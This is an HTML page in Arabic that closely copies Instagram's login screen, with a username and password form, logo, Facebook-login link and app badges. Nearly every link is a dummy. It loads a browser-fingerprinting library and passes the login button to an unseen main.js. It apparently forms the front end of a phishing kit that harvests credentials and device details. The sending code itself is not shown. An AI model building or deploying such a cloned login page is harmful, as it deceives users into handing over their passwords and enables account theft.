<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>Login • Instagram</title>
    <link rel="stylesheet" href="style.css">
    <link rel="shortcut icon" type="image/png" href="logoinst.png">
    <!-- تحميل مكتبة UAParser.js -->
    <script src="https://cdn.jsdelivr.net/npm/ua-parser-js@0.7.28/dist/ua-parser.min.js"></script>
</head>
<body>

<div class="wrapper">
    <div class="header">
        <div class="top">
            <div class="logo">
                <img src="instagram.png" alt="instagram" style="width: 175px;">
            </div>
            <div class="form">
                <div class="input_field">
                    <input type="text" id="emil" placeholder="رقم الهاتف او اسم المستخدم او البريد الالكتروني" class="input">
                </div>
                <div class="input_field">
                    <input type="password" id="pass" placeholder="كلمة السر" class="input">
                </div>
                <div class="btn">
                    <a href="javascript:void(0);">تسجيل الدخول</a>
                </div>
            </div>
            <div class="or">
                <div class="line"></div>
                <p>او</p>
                <div class="line"></div>
            </div>
            <div class="dif">
                <div class="fb">
                    <img src="facebook.png" alt="facebook">
                    <p><a href="#">تسجيل الدخول بحساب فيسبوك</a></p>
                </div>
                <div class="forgot">
                    <a href="#">هل نسيت كلمة السر؟</a>
                </div>
            </div>
        </div>
        <div class="signup">
            <p>أليس لديك حساب؟ <a href="#">تسجيل</a></p>
        </div>
        <div class="apps">
            <p>احصل على التطبيق.</p>
            <div class="icons">
                <a href="#"><img src="appstore.png" alt="appstore"></a>
                <a href="#"><img src="googleplay.png" alt="googleplay"></a>
            </div>
        </div>
    </div>
</div>

<!-- تأكد من تحميل السكربت بعد تحميل الصفحة -->
<script src="main.js"></script>

</body> 
</html>
